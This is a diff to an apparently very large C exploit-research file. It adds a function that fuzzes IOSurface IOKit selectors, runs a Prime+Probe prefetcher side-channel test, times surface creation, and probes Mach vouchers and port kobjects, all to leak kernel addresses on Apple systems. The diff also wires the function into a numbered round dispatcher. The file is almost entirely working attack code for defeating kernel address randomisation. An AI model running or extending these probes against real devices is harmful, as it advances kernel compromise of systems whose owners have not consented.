@@ -16550,6 +16550,364 @@ static void *r419_race_reader(void *arg) {
 }
 
 /*
+ * r421: IOSurface kernel timing + Prime+Probe DMP + IOKit exception
+ *
+ * Vector 1: Trigger kernel-side exception through IOSurface IOConnectCallMethod
+ *   with invalid selectors/args while Mach exception port is registered.
+ *   The kernel exception handler may expose kernel addresses.
+ * Vector 2: Prime+Probe DMP with iteration counting instead of time measurement.
+ *   Count how many loads complete in a fixed interval to detect cache state.
+ * Vector 3: IOSurface create/destroy timing correlation.
+ *   Does the time to create a surface correlate with its kernel object address?
+ *   Measure thousands of create+destroy cycles looking for timing patterns.
+ * Vector 4: Mach voucher attribute leak.
+ *   mach_voucher_attr_command can sometimes leak kernel data.
+ */
+
+static void r421_probe(void) {
+    rlog("\n=== r421: Kernel Timing + Prime+Probe DMP + Voucher ===\n\n");
+    fflush(stdout);
+
+    /* ---- Vector 1: IOKit exception trap ---- */
+    rlog("  Vector 1: IOKit kernel exception via bad selector\n");
+    {
+        /* Create exception port */
+        mach_port_t excPort = MACH_PORT_NULL;
+        kern_return_t kr = mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &excPort);
+        if (kr == KERN_SUCCESS) {
+            mach_port_insert_right(mach_task_self(), excPort,
+                excPort, MACH_MSG_TYPE_MAKE_SEND);
+
+            exception_mask_t oldMasks[32];
+            mach_msg_type_number_t oldCnt = 0;
+            mach_port_t oldPorts[32];
+            exception_behavior_t oldBehaviors[32];
+            thread_state_flavor_t oldFlavors[32];
+
+            task_swap_exception_ports(mach_task_self(),
+                EXC_MASK_ALL,
+                excPort,
+                EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES,
+                ARM_THREAD_STATE64,
+                oldMasks, &oldCnt, oldPorts, oldBehaviors, oldFlavors);
+
+            /* Get IOSurface connection */
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMainPortCompat,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t conn = 0;
+            kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            rlog("    IOServiceOpen: kr=%d conn=0x%x\n", kr, conn);
+
+            if (kr == KERN_SUCCESS) {
+                /* Try calling selectors that might trigger kernel exceptions.
+                   We catch them on our exception port. */
+                uint64_t scalarIn[8] = {0xDEAD, 0xBEEF, 0, 0, 0, 0, 0, 0};
+                uint64_t scalarOut[8] = {0};
+                uint32_t outCnt = 8;
+
+                /* Try a bunch of potentially interesting selectors */
+                int sels[] = {33, 34, 35, 36, 37, 38, 39, 40, 50, 100};
+                for (int s = 0; s < 10; s++) {
+                    outCnt = 8;
+                    memset(scalarOut, 0, sizeof(scalarOut));
+                    kr = IOConnectCallScalarMethod(conn, sels[s],
+                        scalarIn, 2, scalarOut, &outCnt);
+                    if (kr == KERN_SUCCESS || outCnt > 0) {
+                        rlog("    sel[%d]: kr=0x%x outCnt=%u", sels[s], kr, outCnt);
+                        for (uint32_t i = 0; i < outCnt; i++) {
+                            rlog(" out[%u]=0x%llx", i,
+                                (unsigned long long)scalarOut[i]);
+                            if ((scalarOut[i] >> 32) >= 0xFFFFFFF0ULL)
+                                rlog(" ***KERNEL***");
+                        }
+                        rlog("\n");
+                    }
+                }
+
+                /* Try struct methods too */
+                uint8_t structIn[256];
+                uint8_t structOut[4096];
+                memset(structIn, 0x41, sizeof(structIn));
+                size_t structOutSize = sizeof(structOut);
+
+                for (int s = 0; s < 40; s++) {
+                    structOutSize = sizeof(structOut);
+                    memset(structOut, 0, sizeof(structOut));
+                    kr = IOConnectCallStructMethod(conn, s,
+                        structIn, 32, structOut, &structOutSize);
+                    if (kr == KERN_SUCCESS && structOutSize > 0) {
+                        rlog("    struct sel[%d]: kr=0x%x outSize=%zu\n",
+                            s, kr, structOutSize);
+                        /* Scan output for kernel addresses */
+                        uint64_t *outPtr = (uint64_t *)structOut;
+                        for (size_t i = 0; i < structOutSize / 8; i++) {
+                            if ((outPtr[i] >> 32) >= 0xFFFFFFF0ULL &&
+                                outPtr[i] != 0xFFFFFFFFFFFFFFFF) {
+                                rlog("      +%zu: 0x%016llx ***KERNEL***\n",
+                                    i * 8, (unsigned long long)outPtr[i]);
+                            }
+                        }
+                    }
+                }
+
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+
+            /* Check if any exception arrived */
+            struct {
+                mach_msg_header_t hdr;
+                uint8_t body[4096];
+            } exMsg;
+            exMsg.hdr.msgh_size = sizeof(exMsg);
+            exMsg.hdr.msgh_local_port = excPort;
+            kr = mach_msg(&exMsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                0, sizeof(exMsg), excPort, 100, MACH_PORT_NULL);
+            if (kr == KERN_SUCCESS) {
+                rlog("    *** Exception caught from IOKit! id=%d size=%u ***\n",
+                    exMsg.hdr.msgh_id, exMsg.hdr.msgh_size);
+            } else {
+                rlog("    No IOKit exception (expected)\n");
+            }
+
+            /* Restore */
+            for (mach_msg_type_number_t i = 0; i < oldCnt; i++) {
+                task_set_exception_ports(mach_task_self(),
+                    oldMasks[i], oldPorts[i],
+                    oldBehaviors[i], oldFlavors[i]);
+            }
+            mach_port_deallocate(mach_task_self(), excPort);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: Prime+Probe with iteration counting ---- */
+    rlog("\n  Vector 2: Prime+Probe iteration counting\n");
+    {
+        /* Instead of measuring single-access latency, count how many
+           accesses complete in a fixed number of cycles.
+           Use a tight loop with known iteration count. */
+        size_t bufSize = 16 * 1024 * 1024; /* 16MB */
+        volatile uint8_t *buf = (volatile uint8_t *)mmap(NULL, bufSize,
+            PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        if (buf != MAP_FAILED) {
+            /* Initialize - touch every page */
+            for (size_t i = 0; i < bufSize; i += 4096)
+                buf[i] = (uint8_t)i;
+
+            /* Create a pointer chain for cache-line walking.
+               Each 64-byte cache line holds a pointer to the next. */
+            int stride = 4096; /* page stride */
+            int nPages = bufSize / stride;
+            for (int i = 0; i < nPages - 1; i++) {
+                *(volatile uint64_t *)(buf + i * stride) =
+                    (uint64_t)(buf + (i + 1) * stride);
+            }
+            *(volatile uint64_t *)(buf + (nPages - 1) * stride) =
+                (uint64_t)buf;
+
+            /* Measure: traverse chain, count iterations in fixed time */
+            uint64_t start = mach_absolute_time();
+            volatile uint64_t *ptr = (volatile uint64_t *)buf;
+            int iters = 0;
+            /* Run for approximately 1ms */
+            while (mach_absolute_time() - start < 24000) { /* ~1ms at 24MHz */
+                ptr = (volatile uint64_t *)*ptr;
+                iters++;
+            }
+            uint64_t elapsed = mach_absolute_time() - start;
+            rlog("    Chain walk: %d iterations in %llu ticks\n",
+                iters, (unsigned long long)elapsed);
+            rlog("    Avg: %.2f ticks/access\n",
+                (double)elapsed / iters);
+
+            /* Now: write a known valid userspace pointer into the buffer
+               and see if DMP prefetches along it */
+            volatile uint64_t *srcPage = (volatile uint64_t *)(buf + 8 * 1024 * 1024);
+            volatile uint64_t *tgtPage = (volatile uint64_t *)(buf + 12 * 1024 * 1024);
+
+            /* Baseline: measure tgtPage access after eviction (no DMP) */
+            uint64_t base_total = 0;
+            for (int trial = 0; trial < 50; trial++) {
+                /* Evict tgtPage by traversing chain */
+                ptr = (volatile uint64_t *)buf;
+                for (int i = 0; i < nPages; i++)
+                    ptr = (volatile uint64_t *)*ptr;
+                __asm__ volatile("dsb sy" ::: "memory");
+                /* DON'T write pointer */
+                *srcPage = 0;
+                __asm__ volatile("dsb sy" ::: "memory");
+                for (volatile int d = 0; d < 1000; d++);
+                uint64_t tt0 = mach_absolute_time();
+                volatile uint64_t v = *tgtPage;
+                (void)v;
+                uint64_t tt1 = mach_absolute_time();
+                base_total += (tt1 - tt0);
+            }
+            rlog("    Baseline (no ptr): avg %.2f ticks\n",
+                (double)base_total / 50);
+
+            /* DMP test: write tgtPage address into srcPage */
+            uint64_t dmp_total = 0;
+            for (int trial = 0; trial < 50; trial++) {
+                ptr = (volatile uint64_t *)buf;
+                for (int i = 0; i < nPages; i++)
+                    ptr = (volatile uint64_t *)*ptr;
+                __asm__ volatile("dsb sy" ::: "memory");
+                /* Write pointer to trigger DMP */
+                *srcPage = (uint64_t)tgtPage;
+                __asm__ volatile("dsb sy" ::: "memory");
+                /* Wait for DMP */
+                for (volatile int d = 0; d < 1000; d++);
+                uint64_t tt0 = mach_absolute_time();
+                volatile uint64_t v = *tgtPage;
+                (void)v;
+                uint64_t tt1 = mach_absolute_time();
+                dmp_total += (tt1 - tt0);
+            }
+            rlog("    DMP (valid ptr): avg %.2f ticks\n",
+                (double)dmp_total / 50);
+
+            if (base_total > dmp_total + dmp_total / 5) {
+                rlog("    *** DMP DETECTED! Baseline > DMP threshold ***\n");
+            } else {
+                rlog("    DMP not clearly active at this resolution\n");
+            }
+
+            munmap((void *)buf, bufSize);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: IOSurface create/destroy timing ---- */
+    rlog("\n  Vector 3: IOSurface create/destroy timing patterns\n");
+    {
+        unsigned pixFmt = 'BGRA';
+        const void *kk[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef props = CFDictionaryCreate(NULL, kk,
+            (const void**)vv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        /* Time 100 create+destroy cycles */
+        uint64_t times[100];
+        uint32_t sids[100];
+        for (int i = 0; i < 100; i++) {
+            uint64_t t0 = mach_absolute_time();
+            IOSurfaceRef s = IOSurfaceCreate(props);
+            uint64_t t1 = mach_absolute_time();
+            times[i] = t1 - t0;
+            sids[i] = IOSurfaceGetID(s);
+            CFRelease(s);
+        }
+
+        /* Look for timing correlations with surface ID */
+        rlog("    Create timing samples:\n");
+        for (int i = 0; i < 20; i++) {
+            rlog("      sid=%u time=%llu\n", sids[i],
+                (unsigned long long)times[i]);
+        }
+
+        /* Statistical analysis */
+        uint64_t tmin = UINT64_MAX, tmax = 0, tsum = 0;
+        for (int i = 0; i < 100; i++) {
+            if (times[i] < tmin) tmin = times[i];
+            if (times[i] > tmax) tmax = times[i];
+            tsum += times[i];
+        }
+        rlog("    min=%llu max=%llu avg=%llu range=%llu\n",
+            (unsigned long long)tmin, (unsigned long long)tmax,
+            (unsigned long long)(tsum / 100),
+            (unsigned long long)(tmax - tmin));
+
+        CFRelease(props);
+        for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: Mach voucher attribute probing ---- */
+    rlog("\n  Vector 4: Mach voucher attribute probing\n");
+    {
+        /* Create a voucher and inspect its attributes */
+        mach_voucher_t voucher = MACH_PORT_NULL;
+
+        /* Create with ATM (Activity Tracing) recipe */
+        mach_voucher_attr_recipe_data_t recipe;
+        recipe.key = MACH_VOUCHER_ATTR_KEY_ATM;
+        recipe.command = MACH_VOUCHER_ATTR_ATM_CREATE;
+        recipe.previous_voucher = MACH_PORT_NULL;
+        recipe.content_size = 0;
+
+        kern_return_t kr = host_create_mach_voucher(mach_host_self(),
+            (mach_voucher_attr_raw_recipe_array_t)&recipe,
+            sizeof(recipe), &voucher);
+        rlog("    host_create_mach_voucher (ATM): kr=%d voucher=0x%x\n",
+            kr, voucher);
+
+        if (kr == KERN_SUCCESS && voucher != MACH_PORT_NULL) {
+            /* Try extracting attributes */
+            mach_voucher_attr_content_t content;
+            mach_voucher_attr_content_size_t contentSize = 4096;
+            uint8_t contentBuf[4096] = {0};
+
+            kr = mach_voucher_extract_attr_content(voucher,
+                MACH_VOUCHER_ATTR_KEY_ATM,
+                contentBuf, &contentSize);
+            rlog("    extract ATM: kr=%d size=%u\n", kr, contentSize);
+            if (kr == KERN_SUCCESS && contentSize > 0) {
+                uint64_t *cp = (uint64_t *)contentBuf;
+                for (uint32_t i = 0; i < contentSize / 8; i++) {
+                    rlog("      +%u: 0x%016llx", i * 8,
+                        (unsigned long long)cp[i]);
+                    if ((cp[i] >> 32) >= 0xFFFFFFF0ULL)
+                        rlog(" ***KERNEL***");
+                    rlog("\n");
+                }
+            }
+
+            /* Try user data key */
+            recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
+            recipe.command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
+            mach_voucher_t v2 = MACH_PORT_NULL;
+            kr = host_create_mach_voucher(mach_host_self(),
+                (mach_voucher_attr_raw_recipe_array_t)&recipe,
+                sizeof(recipe), &v2);
+            rlog("    host_create_mach_voucher (USER_DATA): kr=%d\n", kr);
+
+            /* kobject on voucher port */
+            unsigned int kotype = 0;
+            mach_vm_address_t koaddr = 0;
+            kr = mach_port_kobject(mach_task_self(),
+                voucher, &kotype, &koaddr);
+            rlog("    voucher kobject: kr=%d type=%u addr=0x%llx\n",
+                kr, kotype, (unsigned long long)koaddr);
+
+            mach_port_deallocate(mach_task_self(), voucher);
+            if (v2 != MACH_PORT_NULL)
+                mach_port_deallocate(mach_task_self(), v2);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r421 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r420: Mach Exception Port Info Leak + DMP Timing + Port Kobject Scan
  *
  * Vector 1: Register Mach exception handler port, trigger controlled
@@ -71297,6 +71655,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 424) {
+            rlog("*** rounds=424: Kernel Timing + Prime+Probe DMP + Voucher ***\n");
+            rlog("  IOKit exception, DMP iteration counting, create/destroy timing, voucher.\n\n");
+            fflush(stdout);
+            r421_probe();
+            goto done;
+        }
         if (rounds == 423) {
             rlog("*** rounds=423: Mach Exception + Kobject + DMP ***\n");
             rlog("  Exception port info leak, special port kobjects, DMP timing.\n\n");
@@ -73850,7 +74215,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
